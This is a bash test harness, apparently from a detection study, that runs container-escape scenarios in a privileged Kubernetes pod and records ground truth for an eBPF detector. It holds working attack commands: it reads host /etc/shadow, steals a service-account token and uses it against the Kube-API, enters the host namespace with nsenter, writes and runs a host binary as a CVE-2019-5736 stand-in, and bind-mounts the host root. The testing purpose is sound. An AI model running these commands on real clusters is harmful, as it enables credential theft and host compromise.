#!/bin/bash
# =============================================================================
# attack_escape.sh -- Container-escape attack scenarios (E1-E4)
# -----------------------------------------------------------------------------
# Runs the vertical-escape scenarios from the Chapter 3 threat model inside the
# privileged attacker pod, and records GROUND TRUTH (which malicious action ran
# and when) to a JSONL file so analysis/score.py can compute ADR/FPR/latency.
#
# Scenarios (Chen et al. escape taxonomy + Bertinatto namespace switch):
#   E1 insecure-config  : read host /etc/shadow via the hostPath mount
#   E2 token theft      : read the service-account token, then hit the Kube-API
#   E3 namespace switch : nsenter --target 1 -m  (openat /proc/1/ns/mnt + setns)
#   E4 component vuln   : BENIGN STAND-IN for CVE-2019-5736 (host-binary
#                         overwrite + execute; non-destructive, reversible)
#
# *** Ensure the eBPF agent is running in another terminal first. ***
# =============================================================================
set -uo pipefail

POD=attacker-escape
GROUND_TRUTH="${GROUND_TRUTH:-ground_truth.jsonl}"
MANIFEST="$(dirname "$0")/manifests/attacker-escape.yaml"

# Append a ground-truth record: {ts, trial, scenario, category, expect_rule}
gt() {
    printf '{"ts": %s, "trial": %s, "scenario": "%s", "category": "%s", "expect_rule": "%s"}\n' \
        "$(date +%s.%N)" "${TRIAL:-1}" "$1" "$2" "$3" >> "$GROUND_TRUTH"
}

echo "=== Deploying privileged attacker pod (fresh, for trial independence) ==="
# Ensure no leftover pod from a previous trial (fresh PID/cgroup per trial).
kubectl delete -f "$MANIFEST" --ignore-not-found --wait=true >/dev/null 2>&1 || true
kubectl apply -f "$MANIFEST"
kubectl wait --for=condition=Ready pod/$POD --timeout=120s

run() { kubectl exec $POD -- sh -c "$1"; }

echo ""
echo "=== E1: Insecure-config escape -- read host /etc/shadow ==="
gt E1 ESCAPE file-boundary
run "head -n 3 /host/etc/shadow" || true
sleep 1

echo ""
echo "=== E2: Service-account token theft + use (token-exfil chain) ==="
# Re-posed (v2 follow-up): reading the token alone is undetectable (every pod
# does it). The detectable signal is the EXFIL CHAIN -- this container reads its
# token and then reaches the Kube-API. Expect 'serviceaccount-token-exfil'.
gt E2 LATERAL serviceaccount-token-exfil
run "head -c 40 /var/run/secrets/kubernetes.io/serviceaccount/token; echo" || true
sleep 1
echo ""
echo "=== E2b: Kube-API access with the stolen token (kube-api-access) ==="
gt E2b LATERAL kube-api-access
# netshoot ships curl -- no install needed. Same container as the token read,
# so it also completes the E2 exfil chain (correlated by cgroup).
run "curl -sk https://${KUBE_API:-10.43.0.1}:443/version || true" || true
sleep 1

echo ""
echo "=== E3: Namespace-switch escape -- nsenter into host mount ns ==="
gt E3 ESCAPE nsenter-bosc
# nsenter (pre-installed in netshoot) does openat(/proc/1/ns/mnt) then
# setns(CLONE_NEWNS): the BoSC escape signature from Bertinatto et al.
run "nsenter --target 1 --mount -- ls /etc/hostname >/dev/null 2>&1" || true
sleep 1

echo ""
echo "=== E4: Component-vuln escape -- BENIGN STAND-IN for CVE-2019-5736 ==="
echo "    (non-destructive: backs up host runc, writes+executes a host binary)"
gt E4 ESCAPE host-binary-exec
run '
  set -e
  RUNC=$(command -v runc || echo /host/usr/local/bin/runc)
  # Reproduce the *detectable signature*: an out-of-boundary write to a host
  # binary followed by its execution. We do NOT touch the real runc.
  cp /host/bin/true /host/tmp/fake-runc 2>/dev/null || cp /bin/true /host/tmp/fake-runc
  printf "#!/bin/sh\ntouch /host/tmp/pwn-success\n" > /host/tmp/fake-runc-payload
  chmod +x /host/tmp/fake-runc-payload
  /host/tmp/fake-runc-payload
  echo "[E4] host artifact created: $(ls -l /host/tmp/pwn-success 2>/dev/null)"
' || true

echo ""
echo "=== E5: Privileged-mount escape -- privileged container issues mount() ==="
echo "    (non-destructive: tmpfs + bind-mount of the host path, then unmount)"
# Only a CAP_SYS_ADMIN/privileged container can call mount(); doing so is the
# escape primitive (Chen et al. privileged-mount). The mount() comes from a
# pod-attributable process, so it fires `privileged-mount` and is NOT filtered
# like host-daemon (fwupd) mounts (A9 pod-scoping).
gt E5 ESCAPE privileged-mount
run '
  mkdir -p /mnt/escape /mnt/hostroot
  mount -t tmpfs tmpfs /mnt/escape 2>&1 | head -1 || true
  mount --bind /host /mnt/hostroot 2>&1 | head -1 || true
  umount /mnt/escape 2>/dev/null || true
  umount /mnt/hostroot 2>/dev/null || true
' || true
sleep 1

echo ""
echo "=== Cleaning up ==="
kubectl exec $POD -- bash -c "rm -f /host/tmp/fake-runc /host/tmp/fake-runc-payload /host/tmp/pwn-success" 2>/dev/null || true
kubectl delete -f "$MANIFEST" --wait=false
echo "Escape scenarios complete. Ground truth -> $GROUND_TRUTH"
